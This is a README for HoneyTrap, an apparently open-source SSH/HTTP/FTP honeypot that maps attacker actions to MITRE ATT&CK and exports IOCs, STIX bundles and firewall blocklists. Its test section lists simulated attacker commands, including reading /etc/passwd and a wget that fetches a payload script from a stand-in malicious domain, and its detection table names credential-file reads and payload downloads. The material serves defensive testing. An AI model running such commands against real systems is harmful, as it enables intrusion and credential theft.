# ⚡ HoneyTrap — Multi-Protocol Honeypot & Threat Intelligence Sensor

[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=flat&logo=python&logoColor=white)](https://python.org)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.104+-009688?style=flat&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=flat&logo=docker&logoColor=white)](https://www.docker.com)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-15_Techniques-orange?style=flat)](https://attack.mitre.org)
[![STIX 2.1](https://img.shields.io/badge/STIX-2.1_Compliant-blue?style=flat)](https://oasis-open.github.io/cti-documentation/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

> **HoneyTrap** is an asynchronous, multi-protocol honeypot network and threat intelligence pipeline. It captures attacker behavior across SSH, HTTP, and FTP surfaces, maps attacks to **15 MITRE ATT&CK techniques**, automatically extracts **Indicators of Compromise (IOCs)**, generates **STIX 2.1 bundles** and firewall blocklists, and visualizes real-time telemetry on an interactive web dashboard.

---

## 🎯 Resume & Technical Highlights

- **Multi-Protocol Deception**: Emulates **SSH** (OpenSSH with 25+ fake interactive Linux commands and session recording), **HTTP** (WordPress login, phpMyAdmin, `.env` file lures), and **FTP** (vsFTPd with RFC 959 passive mode and malware file upload capture).
- **Asynchronous Architecture**: Built entirely on Python's `asyncio` event loop with decoupled pub/sub `EventBus` and worker queues, ensuring honeypot connection handling never blocks real-time analysis or API streaming.
- **MITRE ATT&CK Mapping**: Implements signature rules and temporal sliding-window analytics to detect 15 techniques across 6 tactics (Initial Access, Execution, Credential Access, Discovery, Collection, Command & Control).
- **Automated Threat Intelligence**: Automatic extraction and deduplication of IP addresses, malicious URLs, domains, and credential pairs; automated export to **STIX 2.1 JSON** format for SIEM ingestion.
- **Firewall Integration**: Dynamically compiles attacker telemetry into actionable **iptables**, **nginx deny**, CSV, and plain-text IP blocklists.
- **Full Session Forensics**: Records SSH sessions in **asciicast v2** format for playback and forensic analysis.
- **Real-Time SOC Dashboard**: Web dashboard featuring a Leaflet.js world threat map, Chart.js metrics, and sub-second WebSocket event streaming.

---

## 🏗️ Architecture

```
                       ┌───────────────────────────────────────────────┐
       Attackers       │             HoneyTrap Sensor Node             │
                       │                                               │
     ┌──────────┐      │   ┌──────────┐  ┌──────────┐  ┌──────────┐    │
     │SSH Client│──2222─┼───│ SSH Trap │  │HTTP Trap │  │ FTP Trap │    │
     └──────────┘      │   └────┬─────┘  └────┬─────┘  └────┬─────┘    │
     ┌──────────┐      │        │             │             │          │
     │Web Scanner│──8080─┼────────┴─────────────┼─────────────┘          │
     └──────────┘      │                        │                      │
     ┌──────────┐      │         ┌──────────────▼─────────────┐        │
     │FTP Script│──2121─┼─────────│    Asyncio Event Bus       │        │
     └──────────┘      │         └──────────────┬─────────────┘        │
                       │                        │                      │
                       │         ┌──────────────▼─────────────┐        │
                       │         │  Analysis & Intel Pipeline │        │
                       │         │  • MITRE ATT&CK Engine     │        │
                       │         │  • IOC Extractor           │        │
                       │         │  • GeoIP Resolver          │        │
                       │         └──────────────┬─────────────┘        │
                       │                        │                      │
                       │         ┌──────────────▼─────────────┐        │
                       │         │     SQLite WAL Storage     │        │
                       │         └──────────────┬─────────────┘        │
                       │                        │                      │
                       │         ┌──────────────▼─────────────┐        │
                       │         │ FastAPI + WebSocket Server │        │
                       │         └──────────────┬─────────────┘        │
                       └────────────────────────┼──────────────────────┘
                                                │ :3000
                                       ┌────────▼────────┐
                                       │ Real-Time Web   │
                                       │ SOC Dashboard   │
                                       └─────────────────┘
```

---

## 🛡️ Honeypot Protocols

| Protocol | Port | Simulated Service | Captured Adversary Activities |
| :--- | :--- | :--- | :--- |
| **SSH** | `2222` | OpenSSH 8.9p1 (Ubuntu) | Username/password pairs, 25+ fake shell commands (`ls`, `whoami`, `cat /etc/passwd`, `wget`, `curl`, `ifconfig`, `uname`, `ps`), asciicast v2 session playback. |
| **HTTP** | `8080` | Apache 2.4.54 / PHP 8.1 | WordPress (`/wp-login.php`), phpMyAdmin (`/pma`), administrative panels, credential harvesting, credential stuffing, `.env` file probing. |
| **FTP** | `2121` | vsFTPd 3.0.5 | Anonymous and brute-force logins, directory enumeration, passive transfers, file uploads (`STOR`) to quarantine directory. |

---

## 🔍 MITRE ATT&CK Mapping

HoneyTrap automatically classifies attacker interactions into MITRE ATT&CK techniques:

| Tactic | Technique ID | Technique Name | Detection Trigger |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1078` | Valid Accounts | Successful authentication across any protocol |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Probing web honeypot login forms, `.env`, or admin URLs |
| **Credential Access** | `T1110` | Brute Force | Sliding window: 5+ failed auth attempts in 60 seconds from same IP |
| **Credential Access** | `T1110.001` | Password Guessing | Authentication attempts using common/dictionary passwords |
| **Credential Access** | `T1110.003` | Password Spraying | Same password sprayed across 3+ distinct usernames |
| **Execution** | `T1059` | Command and Scripting Interpreter | Any shell execution via SSH |
| **Execution** | `T1059.004` | Unix Shell | Invocation of Unix shell binaries (`bash`, `sh`, `zsh`) |
| **Discovery** | `T1083` | File and Directory Discovery | `ls`, `find`, `dir`, `pwd`, FTP `LIST` |
| **Discovery** | `T1082` | System Information Discovery | `uname`, `hostname`, `whoami`, `id`, `uptime` |
| **Discovery** | `T1016` | System Network Config Discovery | `ifconfig`, `ip addr`, `netstat`, `route` |
| **Collection** | `T1005` | Data from Local System | Reconnaissance on files (`cat /etc/passwd`, `/etc/shadow`) |
| **Lateral Movement** | `T1021` | Remote Services | Remote connection initialization |
| **Lateral Movement** | `T1021.004` | SSH | Connection established to SSH honeypot |
| **Command & Control** | `T1071.001` | Web Protocols | `wget` or `curl` to external HTTP/HTTPS resources |
| **Command & Control** | `T1105` | Ingress Tool Transfer | Dropping payloads via `wget`, `curl`, or FTP `STOR` |

---

## 🚀 Quick Start

### Option 1: Docker Compose (Recommended)

```bash
# Clone the repository
git clone https://github.com/your-username/honeytrap.git
cd honeytrap

# Copy environment configuration
cp .env.example .env

# Build and launch all services in isolated containers
docker compose up -d
```

Access the dashboard:
- **SOC Web Dashboard**: `http://localhost:3000`
- **SSH Honeypot**: `localhost:2222`
- **HTTP Honeypot**: `http://localhost:8080`
- **FTP Honeypot**: `localhost:2121`

### Option 2: Local Python Execution

```bash
# Set up virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Run HoneyTrap
python3 -m honeytrap.main
```

---

## 🧪 Testing Your Honeypot

Once running, simulate real attacker behavior and watch telemetry stream into the dashboard:

```bash
# 1. Trigger SSH Honeypot (Test fake shell and credential logging)
ssh root@localhost -p 2222
# Password: any password (e.g. toor)
ls -la
whoami
cat /etc/passwd
wget http://malicious-domain.com/c2_payload.sh
exit

# 2. Trigger HTTP Honeypot (Test WordPress lure and credential harvesting)
curl -X POST http://localhost:8080/wp-login.php -d "log=admin&pwd=SuperSecretPassword123"
curl http://localhost:8080/.env

# 3. Trigger FTP Honeypot
ftp -p localhost 2121
# User: anonymous, Password: guest
ls
quit
```

---

## 📡 REST API & STIX 2.1 Threat Intel

| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `/api/stats` | `GET` | Overview metrics (total events, sessions, top adversaries). |
| `/api/events` | `GET` | Paginated event feed with protocol, IP, and time range filters. |
| `/api/sessions` | `GET` | Paginated session summaries. |
| `/api/sessions/{id}` | `GET` | Detailed session event log and asciicast terminal playback. |
| `/api/mitre` | `GET` | MITRE ATT&CK technique detection frequency. |
| `/api/iocs` | `GET` | Extracted Indicators of Compromise (IPs, URLs, domains, creds). |
| `/api/attackers` | `GET` | Top attacking IP addresses with geolocation information. |
| `/api/export/stix` | `GET` | **STIX 2.1 JSON bundle** with Indicators, Attack Patterns, & Relationships. |
| `/api/export/blocklist`| `GET` | Firewall export: `?format=iptables`, `nginx`, `csv`, or `plaintext`. |
| `/ws/events` | `WS` | Real-time WebSocket event stream. |

---

## 📁 Project Structure

```
honeytrap/
├── Dockerfile                  # Production container definition
├── docker-compose.yml          # Single-command orchestration
├── config.yaml                 # Core configuration
├── .env.example                # Environment variables template
├── requirements.txt            # Python dependencies
├── honeytrap/
│   ├── main.py                 # Service orchestrator & entry point
│   ├── config.py               # YAML config loader with env overrides
│   ├── events.py               # Asyncio pub/sub EventBus
│   ├── models.py               # Dataclasses for sessions, events, IOCs
│   ├── store.py                # Asynchronous SQLite storage layer
│   ├── honeypots/
│   │   ├── base.py             # Abstract base honeypot class
│   │   ├── ssh_honeypot.py     # SSH honeypot & fake Unix shell
│   │   ├── http_honeypot.py    # HTTP honeypot (WordPress, phpMyAdmin)
│   │   └── ftp_honeypot.py     # FTP honeypot (RFC 959 passive mode)
│   ├── analysis/
│   │   ├── mitre.py            # MITRE ATT&CK technique engine
│   │   ├── ioc_extractor.py    # IOC extraction & deduplication
│   │   └── geo.py              # Asynchronous GeoIP resolver
│   ├── intel/
│   │   ├── stix_export.py      # STIX 2.1 threat intelligence export
│   │   └── blocklist.py        # iptables / nginx blocklist generator
│   └── api/
│       ├── server.py           # FastAPI server & static file mount
│       ├── routes.py           # REST endpoints & file downloads
│       └── websocket.py        # WebSocket connection manager
├── frontend/
│   ├── index.html              # Dashboard SPA markup
│   ├── style.css               # Dark cyber theme styles
│   └── app.js                  # WebSocket client, Leaflet map, Chart.js
└── tests/
    ├── test_mitre.py           # Unit tests for MITRE mapping & brute-force
    ├── test_ioc_extractor.py   # Unit tests for IOC extraction & filtering
    └── test_ssh_honeypot.py    # Unit tests for SSH fake shell commands
```

---

## ⚖️ License

Distributed under the MIT License.
